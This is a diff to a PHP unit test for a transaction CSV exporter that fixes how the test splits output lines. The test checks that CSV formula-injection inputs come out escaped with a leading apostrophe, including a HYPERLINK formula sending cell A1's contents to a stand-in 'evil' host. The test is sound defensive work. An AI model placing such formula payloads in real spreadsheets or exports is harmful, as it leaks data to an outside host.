@@ -63,8 +63,7 @@ class TransactionCsvExporterTest extends TestCase {
             'amount' => 57.68,
         ])]);
 
-        $row = str_getcsv(explode("
-", trim($csv))[1]);
+        $row = str_getcsv(explode("\n", trim($csv))[1]);
         $this->assertSame('\'=HYPERLINK("http://evil/?"&A1,"Click")', $row[1]);
         $this->assertSame("'@SUM(A1)", $row[2]);
         $this->assertSame("'+cmd", $row[9]);
